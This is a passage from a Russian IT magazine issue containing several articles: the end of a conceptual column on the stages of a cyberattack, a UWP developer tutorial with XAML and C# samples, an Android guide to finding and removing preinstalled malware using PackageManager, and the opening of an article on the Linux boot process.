 определяющая сложность обнаруже ния этого клас са атак защитными сис‐
 темами атакуемого объекта. Связана с целенап равленностью. Это ключевая
 характеристика для оцен ки эффектив ности методов и сис тем защиты.


 ЖИЗНЕННЫЙ ЦИКЛ АТАКИ
 Любую кибератаку можно поделить на ста дии, названия которых пришли
 к нам из военной науки. Каждая ста дия подразумевает набор стра тегий
 и методов для их реализации. И для каждой из стадий сущес твуют превен‐
 тивные меры и стра тегии ответных дей ствий.





            Жизненный цикл атаки (по материалам Gartner)

 Давай на при мерах разберем каждую стадию жизненного цикла атаки и про‐
 иллюс трируем стратегии реализации этапов. Назовем атакующего Василием.





                          Вася ата кует

 Имей в виду, что эти сценарии лишь час тный случай из многообразия тактик
 и средств, которые может использовать ата кующий.


 Раз ведка, под готовка
 Во вре мя разведки Василий пыта ется обнаружить точки входа в целевую
 инфраструк туру. Для этого он вни мательно изучает отчет сво его ска нера
 веб‐уязвимостей, который просканировал пуб личное веб‐приложение, при‐
 над лежащее жертве.
   Кроме того, Вася, анализируя выдачу поисковых сис тем, ищет эксплу ата‐
 бельные ресур сы, IP которых вхо дят в диапа зон адресов целевой орга низа‐
 ции.
   Василий нашел профили нес кольких сотрудников орга низации в социаль‐
 ных сетях и их корпоративные email‐адреса. На основе полученных данных
 Василий под готовил следующий план дей ствий.
  1. Попытаться ском прометировать рабочие станции обнаруженных  сот‐
    рудников.
  2. Если это не удас тся, Василий поп робует использовать пуб личные экс пло‐
    иты, что бы атаковать серверы орга низации, дос тупные из интернета,
    а также роутеры Wi‐Fi в офисах ком пании.
  3. Параллельно с первыми двумя шагами Василий будет искать уяз вимос ти
    в пуб личном веб‐приложе нии в надежде, что скомпро метированное при‐
   ложение предоставит ему доступ к внут ренней инфраструктуре.

 Что бы реали зовать все это, Василий готовит текст письма с вредонос ным
 вло жением  сотрудни кам,  кас томизирует найденные  экс плоиты, а  также
 запускает перебор пароля для админки обнаружен ного веб‐ресур са.


 Доставка, эксплу атация, зак репле ние
 Как ты дума ешь, какой из пунктов имеет больший шанс на успех? Быть может,
 ты видел отче ты консалтинговых компаний и ска жешь, что это веб‐приложе‐
 ние. Или вспом нишь про человечес кий фактор и неком петентность пер‐
 сонала в вопросах ИБ и предположишь, что победит фишинговое письмо
 с вложением. Но Васе все равно, что ты дума ешь, потому что он уже сидит
 с ноутбуком в офи се компании и ждет под ключений мобильных устрой ств ее
 сотрудни ков.
    Так или иначе, итог этой стадии: отстук загружен ного вредоносного кода
 на управляющий сер вер Василия.


 Действие
 Вот тут начинается все самое интерес ное. На практике час то ока зыва ется
 так, что зло умышленник вынужден проводить целую спецоперацию и соз‐
 давать новые точки присутствия для того, чтобы обеспечить себе пос тоянный
 контроль (persistent). Ему при дет ся проводить разведку внутри ском промети‐
 рованной инфраструктуры и перемещаться к ценным ресурсам. Это называ‐
 ется lateral movement: вряд ли полученный доступ к компьютеру бухгалтера
 удовлетворит заказчиков Василия — их скорее интересует интеллектуальная
 собствен ность компании. Ну и в конечном сче те Васе нужно будет провес ти
 незамет ный вывод данных (exﬁltration).


 ПРОТИВОДЕЙСТВИЕ
 Ко неч но, этап противодей ствия должен начинать ся раньше, а не пос ле всех
 описанных стадий. Но иног да бывает так, что Василия начинают искать уже
 пос ле того, как он скрылся с ценными дан ными. И зачастую это происходит
 не только из‐за некомпетентности защищающейся стороны. Прос то Василий
 имел достаточ но вре мени, что бы изучить жертву, прежде чем начал какие‐то
 активные действия, и хорошо знал обо всех защит ных системах. Да и васили‐
 ев зачастую много, а некоторые из них прячутся и среди внутренних сот‐
 рудни ков.
   Именно по опи санным выше при чинам мы постараемся узнать о Васе
 и его намере ниях еще до того, как он реализует все ста дии сво ей атаки.
 Для это го нужно научиться вовремя определять его появление в нашей
 инфраструк туре. Тому, как это делать, я посвящу сле дующие выпуски моей
 колонки.
КОДИНГ





ПРОБУЕМ НОВЫЕ ФИЧИ
UNIVERSAL WINDOWS PLATFORM           Алексей Соммер
                                                                                       asommer@yandex.ru




Клас сичес кие дотнетовские приложения хороши тем, что
они прак тически не ограничены в правах и, например, могут
работать в трее. Зато уни версальные приложения (UWP)
более безопас ны, и их мож но устанавливать и удалять бес‐
числен ное количество раз, не забивая систему и реестр
мусором. Платформа UWP постоянно раз вивается, и, пока
пользовате ли обновляются до Fall Creators Update, который
вышел в октябре это го года, мы, разработчики, можем пос‐
мотреть на его новые и интересные возможности.




                     Windows 10 Fall Creators Update: все, что нужно
                        знать


Готов? Скачивай пос леднюю SDK с офи циальной страницы, и начнем нашу
ознакомитель ную экскурсию.
  В первую оче редь хотелось бы отме тить мно жествен ные улуч шения
в дизайнере XAML . Одним из самых ожидаемых улучшений для меня было
повыше ние скорос ти работы. Сравни скорость загрузки в Fall Creators Update
(сле ва) с простым Creators Update:





                Сравнение про изво дительнос ти XAML

На кон ференции Build 2017 Microsoft анон сирова ла новую систему UI‐дизайна
под наз вани ем Fluent.





                         Microsoft Fluent Design System

И вот с это го обновле ния в UWP начнут появ ляться новые эле менты управле‐
ния, основанные на этой сис теме.


NAVIGATION VIEW
Navigation View — это out of box контрол для отоб ражения меню.





                       Navigation View в режиме Minimal

Ме ню выпадает с левой сто роны. Кроме того, к меню отно сится и полос ка
сверху — Header. На эту полоску можно вынес ти текст заголовка или допол‐
нительные кнопки.
  Ме ню может исполь зовать ся  в  трех раз личных вари ациях. Вариант
на скриншоте сверху — Minimal. В этом режиме Header скрыть нельзя, так
как на нем находится кнопка «гамбургер». Есть еще режим Compact,
в котором справа отоб ражаются иконки меню.





                      Navigation View в режиме Compact

В режиме Expanded меню отоб ража ется раскры тым.
  Изменяя размер окна приложения, ты можешь изменить режим Navigation
View. Ведь система авто матически выбира ет режим исхо дя из размера окна
при ложе ния. На этот выбор мож но пов лиять, указав раз личные значения пик‐
селей   для   атри бутов   OpenPaneLength,   CompactModeThresholdWidth
и ExpandedModeThresholdWidth.
  Пример кода панели навигации:


<NavigationView x:Name="NavView" IsSettingsVisible="True"
                ItemInvoked="NavView_ItemInvoked">
    <NavigationView.MenuItems>
        <NavigationViewItem Content="Начальная страница" Tag="home">
            <NavigationViewItem.Icon>
                <FontIcon Glyph="&#xE10F;"/>
            </NavigationViewItem.Icon>
        </NavigationViewItem>
        <NavigationViewItemSeparator/>
        <NavigationViewItemHeader Content="Новые возможности"/>
        <NavigationViewItem Icon="AllApps" Content="Автозагрузка"
Tag="автозагрузка"/>
        <NavigationViewItem Icon="AllApps" Content="Перезапуск" Tag=
"перезапуск"/>
        <NavigationViewItem Icon="Video" Content="Color picker" Tag=
"color picker"/>
        <NavigationViewItem Icon="Audio" Content="Parallax" Tag=
"parallax"/>
        <NavigationViewItem Icon="Audio" Content="Другие контролы"
Tag="другие"/>
    </NavigationView.MenuItems>
    <NavigationView.HeaderTemplate>
        <DataTemplate>
            <Grid Background="LightGray">
                <Grid.ColumnDefinitions>
                    <ColumnDefinition Width="Auto"/>
                    <ColumnDefinition/>
                </Grid.ColumnDefinitions>
                <TextBlock Style="{StaticResource TitleTextBlockS
tyle}"
                       FontSize="28"
                       VerticalAlignment="Center"
                       Margin="12,0"
                       Text="Это Header"/>
                <CommandBar Grid.Column="1"
                        HorizontalAlignment="Right"
                        DefaultLabelPosition="Right">
                    <AppBarButton Label="Дополнительная кнопка" Icon=
"Refresh"/>
                </CommandBar>
            </Grid>
        </DataTemplate>
    </NavigationView.HeaderTemplate>
    <NavigationView.PaneFooter>
        <Image Source="Assets/logo.png" Width="50" Height="50" />
    </NavigationView.PaneFooter>
    <Frame x:Name="ContentFrame">
        <Frame.ContentTransitions>
            <TransitionCollection>
                <NavigationThemeTransition/>
            </TransitionCollection>
        </Frame.ContentTransitions>
    </Frame>
</NavigationView>





                 Navigation View, получившееся в результате

Об рати внимание, что есть возможность добавить вниз произволь ные кон‐
тролы. В примере туда добавлена картинка (кубик над пунктом меню Settings/
Настройки). Сам пункт меню Settings включается и выключается с помощью
атрибута IsSettingsVisible.
  В коде C# в событии NavView_ItemInvoked можно проверить, была ли
нажата кнопка Settings.


if (args.IsSettingsInvoked)
 {
     ContentFrame.Navigate(typeof(SettingsPage));
 }

Или же можно про верить содержимое args.InvokedItem, где должен быть текст
нажатого эле мен та пункта меню. Нап ример, так:


if (args.InvokedItem=="Начальная страница")
 {
     ContentFrame.Navigate(typeof(HomePage));
 }

Бо лее под робную информацию смотри на официальной страничке докумен‐
тации.


PERSON PICTURE CONTROL
Это элемент управления, отоб ража ющий ава тар и имя/ини циалы пользовате‐
ля. Довольно простой контрол.





                    Так выглядит Person Picture Control

Добавить на страницу его можно с помощью следующего тега:


<PersonPicture DisplayName="John Doe" Foreground="Black" Profil
ePicture="Assets\johndoe.jpg" Initials="JD" />

Его рекомендуется использовать для отоб ражения аватарки текуще го поль‐
зователя или какого‐либо контакта.
  Подробнее почитать о нем можно здесь.


RATING CONTROL
С этим кон тролом тоже все должно быть понят но.




                   Звездочки для выбора рейтинга

Добавить на страницу можно следующим тегом:


<RatingControl x:Name="MyRatings" />

Официальная документация тут.


COLOR PICKER
Долгожданный контрол для выбора цвета (да‐да, мы верим в то, что ты дол го
ждал появ ления контро ла для выбора цвета. :) — Прим. ред.)!





           Эле мент управления, поз воляющий выб рать цвет

В сле дующем при мере при изменении цвета в контро ле автомати чески меня‐
ется цвет фона (использует ся простая привязка, или, выражаясь иначе, бин‐
динг).


 <Grid>
    <Grid.Background>
        <SolidColorBrush Color="{x:Bind myColorPicker.Color,
Mode=OneWay}"/>
    </Grid.Background>
    <ColorPicker x:Name="myColorPicker" />
</Grid>

Официальная документация.


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ





               ПРОБУЕМ НОВЫЕ ФИЧИ
           UNIVERSAL WINDOWS PLATFORM





PARALLAX
Не рав номерное перемещение объектов при прок рутке позволя ет создать
эффект параллакса.





                  Эффект параллакса

Допустим, у тебя есть Grid, а внутри него раз мещен какой‐то элемент, содер‐
жимое которого не помещается на одной странице. И фоном в Grid добав‐
лено изображение. Для того чтобы появил ся эффект парал лакса, необ ходимо
изображение обер нуть в тег Parallax, ука зав в качестве Source привязку
к очень‐очень длинному контенту.
  В сле дующем при мере ListView с именем ForegroundElement не умещается
на экране. Фоном ему уста новлено изображение, и при прокрутке возникнет
красивый эффект.


<Grid>
    <ParallaxView Source="{x:Bind ForegroundElement}" VerticalShift=
"50">
        <!‐‐ Фон ‐‐>
        <Image x:Name="BackgroundImage" Source="Assets/background.
jpg"
           Stretch="UniformToFill"/>
    </ParallaxView>
    <ListView x:Name="ForegroundElement">
        <x:String>Item 1</x:String>
        <x:String>Item 2</x:String>
        <x:String>Item 3</x:String>
        <x:String>Item 4</x:String>
        <x:String>Item 5</x:String>
        <x:String>Item 6</x:String>
        <x:String>Item 7</x:String>
        <x:String>Item 8</x:String>
        <x:String>Item 9</x:String>
        <x:String>Item 10</x:String>
        <x:String>Item 11</x:String>
        <x:String>Item 13</x:String>
        <x:String>Item 14</x:String>
        <x:String>Item 15</x:String>
        <x:String>Item 16</x:String>
        <x:String>Item 17</x:String>
        <x:String>Item 18</x:String>
        <x:String>Item 19</x:String>
        <x:String>Item 20</x:String>
        <x:String>Item 21</x:String>
    </ListView>
</Grid>

Под робнее читай в докумен тации Microsoft.


ACRYLIC MATERIAL
Это даже не совсем элемент управления. Это кисть, которая довольно часто
используется в интерфей сах. Меню «Пуск» в Fall Creators Update выполнено
из акри ла. Вот так выглядит стандар тное при ложение «Калькулятор» с фоном
из акри лового матери ала:





                    Калькулятор с фоном из акри ла

XAML‐код этой кисти может выг лядеть пример но так:


<AcrylicBrush TintColor="#ED3462ED" TintOpacity="0.8" FallbackColor=
"#ADAFAFFF"/>

Больше информации читай на сайте — внезапно — microsoft.com.


REVEAL
Опять не контрол, а определенный све товой эффект, который поз воля ет
акценти ровать внимание пользовате ля на  тех объ ектах,  что  находятся
в фокусе курсора.





                    Эф фект reveal

Не которые контролы поддерживают reveal по умол чанию. Это ListView, Grid‐
View, TreeView, NavigationView, AutosuggestBox, MediaTransportControl, Com‐
mandBar, ComboBox. А на некоторых кон тро лах этот эффект мож но включить,
указав осо бый стиль. Например, это можно ука зать кнопке:


<Button Content="Button Content" Style="{StaticResource Button
RevealStyle}"/>

Официальная информация.


ЕЩЕ ОДНО УЛУЧШЕНИЕ В ДИЗАЙНЕРЕ XAML
Разуме ется, дизай нер  Visual Studio поз воляет отображать эти контро лы
и опти мизи рован для этого. На следующем скриншоте ты можешь увидеть,
как в дизай нере отображен ресурс Acrylic Brush (Fall Creators Update опять
слева).





               Отображение Acrylic Brush в дизай нере

По читать про улучшения XAML‐дизай нера на англий ском с кучей технических
деталей и уточ нений можно здесь: A signiﬁcant update to the XAML Designer.


.NET STANDARD 2.0
Большим шагом вперед стала поддер жка .NET Standard 2.0. Но для него
необходимо, что бы у нашего про екта версия бил да была выше, чем 1627.
Зато теперь портировать код .NET Framework при ложе ний на UWP станет
гораздо проще.


АВТОЗАПУСК ПРИЛОЖЕНИЯ
Кто бы мне сказал, что эти строки я напишу в XXI веке :). Смотри, как стильно,
ново, модно и молодежно это звучит: «одной из самых интересных воз‐
можнос тей является возможность запус кать приложение при запус ке опе‐
раци онной системы». Да‐да, раньше такая воз можность была у Desktop
Bridge при ложений, а у UWP‐при ложений ее не было.
  Настроим манифест. Приложе ние должно использовать namespace‐кон‐
тракт 5‐й версии:


xmlns:uap5="http://schemas.microsoft.com/appx/manifest/uap/windows10/
5"

И необходимо зарегистрировать рас ширение windows.startupTask.


<uap5:Extension
    Category="windows.startupTask"
    Executable="App1.exe"
    EntryPoint="App1.App">
    <uap5:StartupTask
        TaskId="SomeIdThatIUseWithThisApp"
        Enabled="false"
        DisplayName="Name of Test App" />
</uap5:Extension>

Иерархия нашего манифеста будет такой: <Package> → <Applications> → <
Application> → <Extensions> → <uap5:Extension>.
  Зарегистрировать авто запуск приложения мож но с помощью подобного
кода:


// Сначала проверяем состояние автозапуска. Получаем его в
переменную startupTask
StartupTask startupTask = await StartupTask.GetAsync("SomeIdThatIUseW
ithThisApp");
switch (startupTask.State)
{
    case StartupTaskState.Disabled:
        // В случае если автозапуск просто выключен, пробуем его
включить
        StartupTaskState newState = await startupTask.RequestEnableAs
ync();
       // В переменной newState будет получен результат того, было
ли включение автозапуска благополучным
        break;
    case StartupTaskState.DisabledByUser:
        // Здесь автоматически включить автозапуск не получится. Раз
выключено пользователем, то значит, он автоматически его не хочет
включать…
        break;
    case StartupTaskState.DisabledByPolicy:
// Автозапуск выключен групповыми политиками или не поддерживается
устройством
        break;
    case StartupTaskState.Enabled:
        // Все уже включено :)
        break;
}

Этот код требует добав ления следующего пространства имен:


using Windows.ApplicationModel;

По умолчанию после установки при ложения автозапуск выключен.
   Если наше приложение под держивает авто запуск, то мы можем перег‐
рузить метод OnActivated и получить какие‐то параметры. При мерно таким
образом:


protected override void OnActivated(IActivatedEventArgs args)
{
Frame rootFrame = Window.Current.Content as Frame;
if (rootFrame == null)
{
    rootFrame = new Frame();
    Window.Current.Content = rootFrame;
}
if (args.Kind == ActivationKind.StartupTask)
{
  // Здесь ты можешь получить аргументы автозапуска
    var startupArgs = args as StartupTaskActivatedEventArgs;
}
rootFrame.Navigate(typeof(MainPage));
Window.Current.Activate();
}

По читать про эту функциональность на английском можно здесь:
Conﬁgure your app to start at log‐in.


ПЕРЕЗАПУСК ПРИЛОЖЕНИЯ
Еще один при мер из той же серии — возможность перезапус ка приложения.
Предполагается, что это может быть необходимо для переза пуска игры/при‐
ложения пос ле обновления лицензии или уста новки какого‐то дополнитель‐
ного контента.
  Делается перезапуск одной строчкой:


AppRestartFailureReason result = await CoreApplication.Reques
tRestartAsync("строка с какими‐нибудь параметрами, которые можно
считать при активации приложения");

И добав лением пространс тва имен:


using Windows.ApplicationModel.Core;

Возвращаемым значением переменной result может быть одно из зна чений
APPRestartFailureReason: NotInForeground, RestartPending, Other.




                    Перезапускаемое  приложение  дол жно  быть
                    видимым на момент переза пус ка.


Еще есть возможность перезапус тить приложение в кон тексте дру гого поль‐
зователя с помощью RequestRestartForUserAsync.
  Пример перезапускающе гося при ложения находится по следующей ссыл‐
ке: Request Restart Sample.
   Английская статья — тут: How to Restart your App Programmatically.


НАШ ПРИМЕР ГОТОВОГО ПРОЕКТА
Разуме ется, одной теорией сыт не будешь, поэтому все перечисленные фичи
я попробовал на прак тике, в результате чего у меня получилось простенькое
и веселенькое при ложение. Доступно оно на GitHub. Код там ясный и понят‐
ный, думаю, разберешь ся без проб лем.


ЗАКЛЮЧЕНИЕ
Напос ледок хотелось бы заметить, что не так давно вышел в свет UWP‐шный
WinDbg. Обычные дебаггеры позволяют двигаться толь ко впе ред по вре мени
выполнения кода, а этот обладает фичей под наз ванием Time Travel Debug‐
ging (TTD), с помощью которой можно вер нуть ся назад по про цессу исполне‐
ния кода. Интересно, что код можно выпол нить на опре деленной машине
(именно на той, на которой возникает баг) и записать процесс исполнения
кода. Будет создан trace‐файл с расширением .RUN. Этот файл можно про‐
игрывать мно жество раз и анализировать.
КОДИНГ





                        КАК УСТРОЕНЫ ПРОГРАММЫ
                      ДЛЯ ОЧИСТКИ СМАРТФОНА
                      ОТ ВСТРОЕННОЙ МАЛВАРИ





                                                                     Владимир Тимофеев
                                                                                                          android‐tools.ru





Владельцы смартфо нов, приобре тенных на условном «Али‐
экс прессе» за условные пять десят долларов, исчисляются
десятками тысяч. Безусловно, пользоваться такими подел‐
ками мож но, только вот их произво дители вынуждены эко‐
номить на каждом этапе, и здесь мы говорим даже не о
проблемах с железом и качеством сборки — прошивка таких
телефо нов может содержать большие сюрпризы: малварь,
трояны и абсолют но не оптимизированные приложения,
которые беспощадно жрут батарею. В этой статье мы
покажем, как дать решительный бой всему этому дурно пах‐
нущему прог раммно му мусору.




                    Са мый прямой и бру таль ный спо соб решения
                      проблемы зараженной про шивки — накатить чис‐
                      тую и проверен ную. :)



ОТКУДА БЕРУТСЯ ВРЕДОНОСЫ НА УСТРОЙСТВЕ?
Раньше основным каналом поставки на устрой ство вредоносных приложений
были форумы и неофициальные магази ны. Немногие уже вспом нят, как vk
музыка угоняла логины и пароли от нашей самой популярной соци альной
сети. Довольные пользователи скачивали ее с 4pda.ru, а потом некоторые
из них недоуме вали, просматривая свои сес сии из стран, где они никогда
не бывали. Мы уже писали, что сегодня не так слож но опуб ликовать вре донос
в Google Play, тогда вопрос его рас пространения становит ся вопросом поис‐
ковой оптимизации в маркете (ASO).
  Но сейчас нередко прошивку заражают нечес тные пос редни ки или сами
про изводители устройств. В подобном случае спектр злов редной деятель‐
ности прос тирается от банального показа рекламы и кражи личных дан ных
до май нинга наших любимых криптовалют пря мо на всех ядрах устройства.


КАК НАЙТИ ВРЕДОНОС?
Странности в поведе нии устрой ства обычно всплывают уже в первую неделю
использования. Нап ример, одна кастомная кла виату ра вре мя от времени
показы вала межстра ничное объявление в самых неожиданных местах. Другие
«быстрые браузе ры» могут без спроса уста нав ливать чужие при ложе ния.
Заподозрив ано мальную активность, с помощью сторонних программ можно
пос мотреть манифест устрой ства, вызывающе го сомнения. Например, an‐
droid.permission.SYSTEM_ALERT_WINDOW разрешает соз давать окна поверх
всех остальных приложе ний. Очень удобно для показа рекламы, как ты
догадался. А для уста новки приложений нужен android.permission.RE‐
QUEST_INSTALL_PACKAGES.
  Се рые нак рутчики уста новок так и работают — сначала заражаем
устройства сво ими установщиками, потом принимаем заказы от легальных
или не очень разработ чиков на установку. С помощью трюков с accessibil‐
ity service можно даже оставить отзыв и оценку в приложении Google Play.
Отзывы, оценки и количество уста новок — важный фактор для ASO любого
при ложе ния, так что услу га еще долго будет вос тре бова на на рынке.


КАК ОБЕЗВРЕДИТЬ ВРЕДОНОС?
Локализовав злокачественный пакет, мож но сра зу его удалить и успокоиться.
Но простое удаление работа ет, только когда этот пакет не системный. Если
пакет системный, можно его удалить с помощью рут‐доступа. Возьми сторон‐
нее при ложе ние или напиши свой собствен ный инстру мент. Когда рут‐прав
нет, но вредонос есть в списке при ложений, можно просто удалить его
обновле ния и отклю чить его.
   Если на этом мучения пользователя оста нови лись, его мож но поздра вить.
В самых запущенных слу чаях (нет рута, и вредонос засел в системе) может
помочь лишь полная перепрошивка устройства, но она доступна только
с разблокирован ным загрузчиком, а не на всех устрой ствах мож но это сде‐
лать (кстати, и не на всех устройствах можно получить рут‐доступ). Если заг‐
рузчик нельзя разблокировать, нет рут‐прав и вре донос не светится в спис ке
при ложе ний в настройках, то лекарство оста ется только одно — магазин. :)




                    Перед покупкой нового устройства обязательно
                      найди его ветку на 4pda.ru. Там может уже быть
                        вся нужная информация о нежелатель ных при‐
                      ложениях, более чистых прошивках и спо собах
                       получения рут‐прав.



КАК ПРОЧИТАТЬ МАНИФЕСТ УСТАНОВЛЕННОГО ПРИЛОЖЕНИЯ?
Для чтения манифестов не требуется специаль ных разрешений в системе.
Любое приложе ние может это делать без спроса, используя контекст чужого
при ложе ния:


Context context = createPackageContext(packageName, CONTEXT_RESTRIC
TED);
parser = context.getResources().getAssets().openXmlResourceParser(
"AndroidManifest.xml");

Ес ли пишешь свое при ложение, удобнее все го отоб разить манифест в ком‐
поненте WebView. Сначала сгенери руй кра сивый HTML‐файл (со сти лями CSS
и прочим), потом заг рузи его в WebView. Есть также и готовые читал ки
манифес тов, в маркете можешь сам поис кать по запросу manifest view.


КАК ПОЛУЧИТЬ МНОЖЕСТВО ИНФОРМАЦИИ ОБ УСТАНОВЛЕННОМ
APK ПРИ ПОМОЩИ PACKAGEMANAGER?
С первой вер сии Android SDK у нас есть замечатель ный инс трумент — класс
PackageManager. Его метод getInstalledApplications вернет список уста‐
новленных на устрой стве приложений (ApplicationInfo), как сис темных, так
и пользовательских. Зная установленные на устройстве при ложе ния, можно
оптимизи ровать рекламу. Например, не показывать рекламу тех, что уже есть.
Или же мож но просто собирать ста тистику по поль зователям. Есть мнение,
что кто‐то за эту статистику пла тит, но мне таких пока не встре чалось.
   Класс ApplicationInfo содержит мно го полез ной информации (имя пакета,
путь до APK‐фай ла, включено или отклю чено приложение и так далее).
Но если ее оказалось мало, то вызови метод getPackageInfo() для нужного
име ни пакета при ложе ния, и получишь еще больше данных в классе Package‐
Info (вер сия, время уста новки, время пос леднего обновления и прочее).


КАК ИЗВЛЕЧЬ УСТАНОВЛЕННЫЙ APK-ФАЙЛ?
Класс PackageManager позволяет нам получить не толь ко список всех
зарегистрирован ных пакетов в системе, но и сами APK‐файлы этих пакетов.
Директория ApplicationInfo.sourceDir содержит путь до APK‐фай ла (нап‐
ример, /data/app/имя_пакета/base.apk). Мы можем ско пировать файл
во внутреннюю кеш‐пап ку нашего приложения, а отту да уже поделиться
с другими приложе ниями с помощью FileProvider.
  Использование FileProvider — рекомендованный Google способ обме на
файлами между приложениями. Он, кста ти, не требует прав доступа к внеш‐
нему хра нилищу <uses‐permission android:name="android.permission.
WRITE_EXTERNAL_STORAGE"/>,  так что простое при ложе ние будет иметь
на один зап рос прав мень ше. Вот мы копиру ем APK в папку с кешем:


public static File copyFileToFilesDir(Context context, String
fileName, String name) throws IOException {
  File src = new File(fileName);
  File dst = new File(context.getCacheDir(), name + ".apk");
  FileChannel inChannel = new FileInputStream(src).getChannel();
  FileChannel outChannel = new FileOutputStream(dst).getChannel();
  try {
    inChannel.transferTo(0, inChannel.size(), outChannel);
  } catch (IOException e) {
    e.printStackTrace();
  } finally {
    if (inChannel != null) {
      inChannel.close();
    }
    outChannel.close();
  }
  return dst;
}

Вот как поделиться приложением:


public void shareApk(View view) throws IOException {
  Intent shareIntent = new Intent();
  shareIntent.setAction(Intent.ACTION_SEND);
  shareIntent.setType("application/xml");
  Uri uri = FileProvider.getUriForFile(this, "ru.androidtools.
greenbro.files",
    Tools.copyFileToFilesDir(this, app.sourceDir, app.packageName));
  shareIntent.putExtra(Intent.EXTRA_STREAM, uri);
  startActivity(Intent.createChooser(shareIntent, getResources().
getText(R.string.share_file)));
}


КАК ПРОВЕРИТЬ ПРИЛОЖЕНИЕ НА ПРИСУТСТВИЕ В МАРКЕТАХ И
ЧТО ДАЕТ ЭТА ИНФОРМАЦИЯ?
Класс PackageManager может сказать нам имя пакета приложения, уста‐
новив шего пакет. Для это го исполь зуется метод getPackageManager().get‐
InstallerPackageName(), который вернет стро ку. Например, Play Маркет
име ет com.google.market или com.google.market, Amazon App Store —
com.amazon.venezia, маркет от Samsung — com.sec.android.app.samsun‐
gapps. А вот приложе ния с F‐Droid указывают не на него, а на com.google.
android.packageinstaller, как буд то бы их уста новил сам пользователь.
   Зная источник уста нов ки и имя пакета самого при ложе ния, можно пос‐
тучать ся в мар кеты по конкретным URL. Наличие программы в маркете — уже
некоторый повод для само успокоения, все‐таки их иногда чистят. А вот если
при ложе ние было из маркета удалено, то это серьезный сигнал для бес‐
покой ства (его, конеч но, мог ли удалить из‐за какой‐нибудь чепухи, вро де
наруше ния чужих авторских прав, но, ско рее всего, это было что‐то реально
нехорошее).
  Для получения URL приложения в Play Маркет и F‐Droid используй строчки


String playStoreUrl = "https://play.google.com/store/apps/
details?id=" + packageName;
String fdroidStoreUrl = "https://www.f‐droid.org/packages/" + packag
eName;

Аналогично можно проверять и остальные маркеты. Код простой проверки
(запускай толь ко в фоновых потоках, так как используется сеть):


private void checkPlayMarket(String playStoreUrl) {
  try {
    URL url = new URL(playStoreUrl);
    HttpURLConnection connection = (HttpURLConnection) url.openCo
nnection();
    connection.setRequestMethod("GET");
    connection.connect();
    int code = connection.getResponseCode();
    if (code == 200){
      // Есть в маркете
    }
    if (code == 404){
      // Нет в маркете
    }
    connection.disconnect();
  } catch (Exception e) {
    Log.e("CheckStoreTask", e.toString());
  }
}


ЧИТАЕМ СИСТЕМНЫЕ РЕСУРСЫ ОПИСАНИЯ РАЗРЕШЕНИЙ
ANDROID
Бы вает, что нужно сделать описание разрешений, используемых приложе‐
нием. Для таких случаев можно загото вить множес тво строчек, помноженное
на количество локалей... плюс к каждой нужна своя картинка. От таких
решений APK нашего конеч ного приложе ния будет пухнуть на глазах. А как ты
зна ешь, есть еще люди в 2017 году (за пре дела ми Мос квы их несколько мил‐
лионов), для которых раз мер APK‐файла при ложе ния очень важен. Места
на хранили ще устройства наверняка хватает всем, но очень дорогой интернет
заставляет людей учитывать этот показа тель при выборе приложения.
  Мож но зай ти с другой сто роны и взять описание и ресурсы из самой сис‐
темы (класс PermissionInfo). Они уже сра зу будут локализованы, так что
перевод чики пока отдохнут. Список раз решений конкретного приложе ния
получаем вот так:


PackageInfo packageInfo = getPackageManager().getPackageInfo(app.
packageName, PackageManager.GET_PERMISSIONS);
String[] requestedPermissions = packageInfo.requestedPermissions;

Информацию о разрешениях — так:


PermissionInfo pinfo = getPackageManager().getPermissionInfo(reques
tedPermissions[i], PackageManager.GET_META_DATA);

Как ты знаешь, разрешения в «Андроиде» раз делены по группам. Получаем
заголо вок getGroupTitle(pinfo.group):


private String getGroupTitle(String perm) {
  String result = getString(R.string.others_permission);
  try {
    PermissionGroupInfo groupInfo = getPackageManager().getPer
missionGroupInfo(perm, 0);
    result = groupInfo.loadLabel(getPackageManager()).toString();
  } catch (PackageManager.NameNotFoundException e) {
    e.printStackTrace();
  }
  return result;
}

Заголо вок разрешения и картинку:


private CharSequence loadItemInfoLabel(PermissionInfo pinfo) {
  CharSequence label = pinfo.loadLabel(getPackageManager());
  if (label == null) {
    label = pinfo.name;
  }
  return label;
}
private Drawable loadItemInfoIcon(String perm) {
  Drawable icon;
  icon = Tools.getPermissionDrawable(getPackageManager(), perm);
  if (icon == null) icon = ContextCompat.getDrawable(this, R.drawable
.ic_perm_device_info);
  return icon;
}

Будь осто рожен: в любой момент может прийти null, так что имей заглушки
на этот случай. Пока!
UNIXOID





       ОТ НАЖАТИЯ КНОПКИ ВКЛЮЧЕНИЯ
               ДО РАБОЧЕГО СТОЛА





                                                                              Евгений Зобнин
                                                                                    Редактор Unixoid и Mobile
                                                                                                  zobnin@glc.ru





Луч ший спо соб понять, как работает опе рационная сис‐
тема, — это проследить поэтап но ее загрузку. Имен но
во время заг рузки запускаются все те механизмы, что при‐
водят ОС в движение. Про цесс этот сложный, многоступен‐
чатый и порой запутанный. Изучать его инте ресно, а откры‐
тия, которые ты сделаешь при этом, могут сильно тебя уди‐
вить.


В целом заг рузку сред неста тистического дистрибути ва Linux мож но раз‐
делить на пять стадий:
 1. Загрузчик.
 2. Запуск и пер вичная ини циали зация ядра.
 3. Обнаруже ние обо рудования, заг рузка драйверов и подключение фай‐
   ловых систем.
 4. Запуск системных служб (демонов).
 5. Старт графической или консольной поль зователь ской сессии.

Мы пройдемся по всем ста диям и узнаем, что про исходит во вре мя загрузки
типич ного дис трибутива Linux, немного отклонившись в сторону BSD, macOS
и Android по пути. Во многих случаях это позволит понять, почему процесс
загрузки Linux именно такой, какой есть.


1. ЗАГРУЗЧИК
Все начинается с загрузчи ка, которому во вре мя старта машины BIOS
передает управле ние. В старые времена, ког да Linux был не так популя рен,
в качестве заг рузчи ка использовался LILO (Linux Loader) — простой, очень
при митив ный и не позволяющий менять конфигура цию загрузки на лету. Фак‐
тически конфигурацион ный файл был вшит в сам загрузчик, и его приходи‐
лось переустанав ливать после каждой сме ны настроек: обновил ядро, забыл
пере установить, и твой ноутбук больше не грузится.
  Сегодня загрузкой Linux практически в любом дистрибутиве занимается
Grub, изначально разработанный для операци онной системы GNU/Hard.
Grub гораздо слож нее LILO и фактически сам явля ется пол ноценной ОС. Он
не просто читает кон фиг заг рузки (обычно это /boot/grub/grub.cfg) прямо
с диска, но и поз воля ет испра вить этот конфиг на мес те. Grub име ет встро‐
енную командную строку, работа ет с десятком раз личных файловых сис тем
и поз воляет фор мировать слож ные цепочки заг рузки.
   Как только пользователь выбира ет нуж ный пункт меню (либо по истечении
